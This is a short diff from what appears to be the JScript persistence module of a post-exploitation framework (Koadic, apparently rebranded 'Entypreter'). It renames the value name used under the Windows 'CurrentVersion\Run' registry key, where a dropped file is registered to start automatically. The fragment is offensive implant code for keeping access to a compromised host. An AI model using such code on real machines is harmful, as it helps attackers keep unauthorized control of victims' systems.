@@ -3,7 +3,7 @@ try
     var headers = {};
     var path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
     var droppath = entypreter.file.getPath("~FDROPDIR~\\~FDROPFILE~");
-    var key = "K0adic";
+    var key = "Entypreter";
 
     if (~CLEANUP~)
     {
